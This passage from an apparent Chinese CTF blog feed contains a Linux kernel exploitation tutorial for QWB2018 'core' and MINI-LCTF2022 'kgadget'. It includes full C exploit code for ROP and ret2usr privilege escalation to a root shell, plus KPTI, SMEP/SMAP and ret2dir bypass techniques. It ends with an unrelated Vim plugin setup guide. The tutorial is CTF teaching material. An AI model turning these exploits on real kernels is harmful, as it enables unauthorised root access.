MOV_RDI_RAX_CALL_RDX+kernel_offset; <span class="comment">// 因为为call，会push ip入栈</span></span><br><span class="line">    rop_chain[i++] = commit_creds;</span><br><span class="line">    rop_chain[i++] = SWAPGS_POPFQ_RET+kernel_offset;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = IRETQ+kernel_offset;</span><br><span class="line">    rop_chain[i++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop_chain[i++] = user_cs;</span><br><span class="line">    rop_chain[i++] = user_rflags;</span><br><span class="line">    rop_chain[i++] = user_sp+<span class="number">8</span>;     <span class="comment">// userland stack balance</span></span><br><span class="line">    rop_chain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Start to execute ROP chain in kernel space...&quot;</span>);</span><br><span class="line">    write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">    core_copy(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    exploition();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./exp.c -o exp -static -masm=intel</span><br></pre></td></tr></table></figure>
<p>打包进文件系统，执行exp获取root shell</p>
<img src="/posts/8981f97e/image-20250602142213030.png" class="" title="image-20250602142213030">
<h3 id="返回用户态-with-KPTI-bypass"><a href="#返回用户态-with-KPTI-bypass" class="headerlink" title="返回用户态 with KPTI bypass"></a>返回用户态 with KPTI bypass</h3><p>如果开启了KPTI（内核页表隔离），不能像前面直接swapgs ; iretq返回用户态，而是在返回用户态之前还需要将用户进程的页表给切换回来。</p>
<blockquote>
<p>Linux采用四级页表结构(PGD -&gt; PUD -&gt; PMD -&gt; PTE)，而CR3控制寄存器用以存储当前的PGD的地址，因此在开启KPTI的情况下用户态与内核态之间的切换便涉及到CR3的切换，为了提高切换的速度，内核将内核空间的PGD和用户空间的PGDD两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间在高地址），这样只需要将CR3的第13位取反便能完成页表切换的操作。</p>
<img src="/posts/8981f97e/Rm8Ti9MpVUZ7fPK.png" class="" title="image.png">

<p>这两张页表上都有对用户空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有内核页表中才有对内核内存空间的完整映射。</p>
<img src="/posts/8981f97e/q74X6lbTnrNGhC1.png" class="" title="image.png">
<p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应的在<code>arch/x86/entry/entry_64.S</code>中提供了一个用于完成内核态页表切换回到用户态页表的函数<code>swapgs_restore_regs_and_return_to_usermode</code>，地址也可以在<code>proc/kallsyms</code>中获得。</p>
</blockquote>
<img src="/posts/8981f97e/FpymLdwJMnRU4hi.png" class="" title="image.png">
<p>在实际操作时前面的栈操作可以跳过，直接从<code>mov rdi, rsp</code>开始</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi, cr3</span><br><span class="line">or rdi, 0x1000</span><br><span class="line">mov cr3, rdi</span><br><span class="line">pop rax</span><br><span class="line">pop rdi</span><br><span class="line">swapgs</span><br><span class="line">iretq</span><br></pre></td></tr></table></figure>
<p>因此对应的栈布局</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">↓	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">    <span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line">    <span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure>
<h4 id="例题：强网杯2018-core-1"><a href="#例题：强网杯2018-core-1" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h4><p>在启动脚本中启动参数添加<code>pti=on</code>开启KPTI保护<br>之前的exp无法执行，会报segfault，因为在内核态页表下用户地址无法执行。<br>因此在返回用户态之前还需要先将内核态页表切换回来，这里直接调用<code>swapgs_restore_regs_and_return_to_usermode</code>函数返回用户态即可。</p>
<img src="/posts/8981f97e/image-20250602144835707.png" class="" title="image-20250602144835707">

<h2 id="02-Kernel-ROP-ret2usr"><a href="#02-Kernel-ROP-ret2usr" class="headerlink" title="02. Kernel ROP - ret2usr"></a>02. Kernel ROP - ret2usr</h2><p>在未开启SMAP&#x2F;SMEP保护的情况下，内核空间是可以访问用户空间的数据的。因此通过kernel ROP以内核ring0权限执行用户空间代码来完成提权。<br>ret2usr只需要在用户态程序构造好对应的<code>commit_creds(prepare_kernel_cred(NULL))</code>函数指针即可。<br>对于开启了SMAP&#x2F;SMEP保护的kernel而言，内核空间访问用户空间会引发kernel panic。</p>
<h3 id="例题：强网杯2018-core-2"><a href="#例题：强网杯2018-core-2" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h3><p>劫持控制流后，构造好对应的函数指针和相关指令直接返回到用户空间进行ret2usr提权。<br>构造exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define symbols variables</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// enter kernel func: save status </span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to get the root!&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;[+] Successful to get the root.&quot;</span>);</span><br><span class="line">    log_info(<span class="string">&quot;[*] Execve root shell now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// to exit normally, instead of potential segmentation fault</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred_kfunc)(<span class="type">void</span> *task_struct);</span><br><span class="line"><span class="type">int</span> (*commit_creds_kfunc)(<span class="type">void</span> *cred);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ret2usr_attack</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    prepare_kernel_cred_kfunc = (<span class="type">void</span>*(*)(<span class="type">void</span>*)) prepare_kernel_cred;</span><br><span class="line">    commit_creds_kfunc = (<span class="type">int</span> (*)(<span class="type">void</span> *))commit_creds;</span><br><span class="line"></span><br><span class="line">    (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, user_ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, user_sp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;sub rax, 8;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, user_cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;lea rax, get_root_shell;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;swapgs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;iretq;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// interact with /proc/core</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889b</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off_val</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889c</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889a</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploition</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS            0xffffffff8109c8e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET             0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_CALL_RDX    0xffffffff8101aa6a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET             0xffffffff810a0f49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET             0xffffffff81021e53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPFQ_RET        0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ                   0xffffffff81050ac2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploition</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    FILE *ksyms_file;</span><br><span class="line">    <span class="comment">// open device</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> canary;</span><br><span class="line">    <span class="type">size_t</span> rop_chain[<span class="number">0x100</span>], i;</span><br><span class="line">    </span><br><span class="line">    log_info(<span class="string">&quot;[*] Start to exploit...&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] open device error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get addresses of kernel symbols</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Reading /tmp/kallsyms...&quot;</span>);</span><br><span class="line">    ksyms_file = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ksyms_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to open the sym_table file!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(ksyms_file, <span class="string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (prepare_kernel_cred &amp;&amp; commit_creds) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                SUCCESS_MSG(<span class="string">&quot;[+] Successful to get the addr of commit_creds: &quot;</span>)</span><br><span class="line">                <span class="string">&quot;%lx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(</span><br><span class="line">                <span class="string">&quot;[+] Successful to get the addr of prepare_kernel_cred: &quot;</span>)</span><br><span class="line">                <span class="string">&quot;%lx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = commit_creds - COMMIT_CREDS;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot;[+] Got kernel base: &quot;</span>) <span class="string">&quot;%lx&quot;</span></span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot; , kaslr offset: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">        kernel_base,</span><br><span class="line">        kernel_offset</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Reading value of kernel stack canary...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    set_off_val(fd, <span class="number">64</span>);</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    canary = ((<span class="type">size_t</span>*) buf)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got kernel stack canary: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// build rop chain</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop_chain[i++] = (<span class="type">size_t</span>) ret2usr_attack;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Start to execute ROP chain in kernel space...&quot;</span>);</span><br><span class="line">    write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">    core_copy(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    exploition();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ret2usr-with-SMAP-SMEP-Bypass"><a href="#ret2usr-with-SMAP-SMEP-Bypass" class="headerlink" title="ret2usr with SMAP&#x2F;SMEP Bypass"></a>ret2usr with SMAP&#x2F;SMEP Bypass</h3><p>需要先关闭SMEP保护。<br>intel下系统根据CR4控制寄存器的第20、21位标识来确定是否开启SMEP&#x2F;SMAP保护（1为开启，0为关闭），若是能改变CR4寄存器的值就能关闭保护。</p>
<img src="/posts/8981f97e/sYFKuZiUVNIclBp.png" class="" title="image.png">
<p>可以使用<code>cat /proc/cpuinfo</code>查看其中开启的保护类型<br>在启动脚本中添加smep和smap保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 1024M \</span><br><span class="line">-cpu qemu64-v1,+smep,+smap \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs_patched.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic </span><br></pre></td></tr></table></figure>

<p>需要通过ROP来关闭SMEP&#x2F;SMAP，直接给CR4复制0x6f0即可<br>使用到的gadgets</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AND_RAX_RDI_RET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET</span></span><br></pre></td></tr></table></figure>
<p>直接修改CR4为0x6f0即可</p>
<img src="/posts/8981f97e/image-20250602191048298.png" class="" title="image-20250602191048298">
<h2 id="03-Kernel-ROP-ret2dir"><a href="#03-Kernel-ROP-ret2dir" class="headerlink" title="03. Kernel ROP - ret2dir"></a>03. Kernel ROP - ret2dir</h2><p>ret2dir（return to direct mapping area）<br>绕过smep&#x2F;smap&#x2F;pxn等用户空间与内核空间隔离的防护手段。<br>x86下的Linux kernel的内存布局，存在一块区域<code>direct mapping area</code>，内核的线性映射区，线性地直接映射了整个物理内存空间。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br></pre></td></tr></table></figure>
<p>这块区域存在意味着：对于一个被用户进程使用的物理页框，同时存在着一个用户空间地址和内核空间地址到该物理页框的映射，即我们利用这两个地址进行内存访问时访问的是同一个物理页框<br>当开启SMEP、SMAP、PXN等防护时，内核空间到用户空间的直接访问被禁止，无法直接使用ret2usr的攻击方式，但利用内核线性映射区对整个物理地址空间的映射，我们可以利用一个内核空间上的地址访问到用户空间的数据。<br>下图为攻击示例，我们在用户空间中布置的gadget可以通过direct mapping area上的地址在内核空间中访问到。</p>
<img src="/posts/8981f97e/2QMrXEh9qLymCoK.png" class="" title="image.png">
<p>在新版的内核当中<code>direct mapping area</code>已经不再具有可执行权限，因此仍然需要在用户空间布置ROP链来完成利用<br>一种朴素的方法：</p>
<ul>
<li>利用mmap在用户空间大量申请内存</li>
<li>利用漏洞泄漏内核的“堆”上地址（通过kmalloc获取到的地址），这个地址直接来自于线性映射区</li>
<li>利用泄露出的内核线性映射区的地址进行内存搜索，从而找到我们在用户空间的内存<br>但是一般很难实现搜索，可以使用喷射的方法来命中。</li>
</ul>
<h3 id="例题：MINI-LCTF2022-kgagdet"><a href="#例题：MINI-LCTF2022-kgagdet" class="headerlink" title="例题：MINI-LCTF2022 - kgagdet"></a>例题：MINI-LCTF2022 - kgagdet</h3><p>启动脚本关闭了KASLR，开启了SMEP&#x2F;SMAP保护<br>分析漏洞内核模块<code>kgadget.ko</code><br>kernel_module_init函数注册了<code>/dev/kgadget</code>设备</p>
<img src="/posts/8981f97e/image-20250602192427811.png" class="" title="image-20250602192427811">
<p>其文件操作结构体定义如下，注册了write, ioctl, open, release操作函数：</p>
<img src="/posts/8981f97e/image-20250602192533405.png" class="" title="image-20250602192533405">
<p><code>kgadget_write</code>函数没什么用</p>
<img src="/posts/8981f97e/image-20250602192638924.png" class="" title="image-20250602192638924">
<p><code>kgadget_ioctl</code>函数向栈空间写入内容，同时会解引用param的值作为函数指针执行。</p>
<img src="/posts/8981f97e/image-20250602192804072.png" class="" title="image-20250602192804072">

<p>不能直接将其写为用户空间地址</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用ret2dir + physmap spray<br>在用户空间布置恶意数据，然后在内核空间的direct mapping area区域找到对应地址即可。<br>使用栈迁移，将栈迁移到用户空间布置的恶意数据上，随后在恶意数据靠后的位置布置提权降落回用户态的ROP链即可。<br>在每个内存页都是三段式的ROP链，<code>栈迁移 - ret滑板 - 常规ROP链</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Vim配置方案</title>
    <url>/posts/d3945d8b.html</url>
    <content><![CDATA[<h1 id="Vim配置方案"><a href="#Vim配置方案" class="headerlink" title="Vim配置方案"></a>Vim配置方案</h1><p>参考链接：</p>
<ul>
<li><a href="https://cloud.tencent.com/developer/article/2038154">Vim的终极配置方案，完美的写代码界面! ——.vimrc[通俗易懂]</a></li>
<li><a href="https://blog.csdn.net/zhangpower1993/article/details/52184581">vim插件管理器：Vundle的介绍及安装（很全）</a></li>
</ul>
<p>在<code>~/.vimrc</code>修改配置即可：</p>
<h2 id="安装Vundle"><a href="#安装Vundle" class="headerlink" title="安装Vundle"></a>安装Vundle</h2><p>安装插件工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</span><br></pre></td></tr></table></figure>

<p>在<code>~/.vimrc</code>头部添加以下信息(下面的几个Plugin是例子)：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nocompatible              <span class="string">&quot; be iMproved, required</span></span><br><span class="line"><span class="string">filetype off                  &quot;</span> required</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="string">set rtp+=~/.vim/bundle/Vundle.vim</span></span><br><span class="line"><span class="string">call vundle#begin()</span></span><br><span class="line"><span class="string">&quot;</span> alternatively, pass a path <span class="built_in">where</span> Vundle should install plugins</span><br><span class="line"><span class="string">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">let</span> Vundle manage Vundle, required</span><br><span class="line">Plugin <span class="string">&#x27;VundleVim/Vundle.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; The following are examples of different formats supported.</span></span><br><span class="line"><span class="string">&quot;</span> Keep Plugin commands between vundle#begin/end.</span><br><span class="line"><span class="string">&quot; plugin on GitHub repo</span></span><br><span class="line"><span class="string">Plugin &#x27;tpope/vim-fugitive&#x27;</span></span><br><span class="line"><span class="string">&quot;</span> plugin from http://vim-scripts.org/vim/scripts.html</span><br><span class="line"><span class="string">&quot; Plugin &#x27;L9&#x27;</span></span><br><span class="line"><span class="string">&quot;</span> Git plugin not hosted on GitHub</span><br><span class="line">Plugin <span class="string">&#x27;git://git.wincent.com/command-t.git&#x27;</span></span><br><span class="line"><span class="string">&quot; git repos on your local machine (i.e. when working on your own plugin)</span></span><br><span class="line"><span class="string">Plugin &#x27;file:///home/gmarik/path/to/plugin&#x27;</span></span><br><span class="line"><span class="string">&quot;</span> The sparkup vim script is <span class="keyword">in</span> a subdirectory of this repo called vim.</span><br><span class="line"><span class="string">&quot; Pass the path to set the runtimepath properly.</span></span><br><span class="line"><span class="string">Plugin &#x27;rstacruz/sparkup&#x27;, &#123;&#x27;rtp&#x27;: &#x27;vim/&#x27;&#125;</span></span><br><span class="line"><span class="string">&quot;</span> Install L9 and avoid a Naming conflict <span class="keyword">if</span> you<span class="string">&#x27;ve already installed a</span></span><br><span class="line"><span class="string">&quot; different version somewhere else.</span></span><br><span class="line"><span class="string">&quot; Plugin &#x27;</span>ascenator/L9<span class="string">&#x27;, &#123;&#x27;</span>name<span class="string">&#x27;: &#x27;</span>newL9<span class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; All of your Plugins must be added before the following line</span></span><br><span class="line"><span class="string">call vundle#end()            &quot; required</span></span><br><span class="line"><span class="string">filetype plugin indent on    &quot; required</span></span><br><span class="line"><span class="string">&quot; To ignore plugin indent changes, instead use:</span></span><br><span class="line"><span class="string">&quot;filetype plugin on</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; Brief help</span></span><br><span class="line"><span class="string">&quot; :PluginList       - lists configured plugins</span></span><br><span class="line"><span class="string">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span></span><br><span class="line"><span class="string">&quot; :PluginSearch foo - searches for foo; append `!` to refresh local cache</span></span><br><span class="line"><span class="string">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; see :h vundle for more details or wiki for FAQ</span></span><br><span class="line"><span class="string">&quot; Put your non-Plugin stuff after this line</span></span><br></pre></td></tr></table></figure>



<p><strong>安装插件方法</strong>：</p>
<ul>
<li>打开vim，执行命令：<code>:PluginInstall</code></li>
<li>命令行中运行：<code>vim +PluginInstall +qall</code></li>
</ul>
<p><strong>移除不需要的插件</strong>：</p>
<ul>
<li>删去.vimrc中对应行后执行BundleClean</li>
</ul>
<p>更新插件：BundleUpdate</p>
<p>列出插件：BundleList</p>
<p>查找插件：BundleSearch</p>
<h2 id="安装YouCompleteMe"><a href="#安装YouCompleteMe" class="headerlink" title="安装YouCompleteMe"></a>安装YouCompleteMe</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo apt install build-essential cmake vim-nox python3-dev exuberant-ctags</span><br><span class="line">sudo apt install mono-complete golang nodejs openjdk-17-jdk openjdk-17-jre npm</span><br><span class="line">cd ~/.vim/bundle/</span><br><span class="line">git clone https://github.com/ycm-core/YouCompleteMe.git</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">python3 install.py --all</span><br></pre></td></tr></table></figure>

<p>中间有一些库可能需要开代理，比如gopls</p>
<p>最终解决方案是修改代理，然后在 cmd 下面输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>

<p>安装结束后关闭</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=off</span><br></pre></td></tr></table></figure>



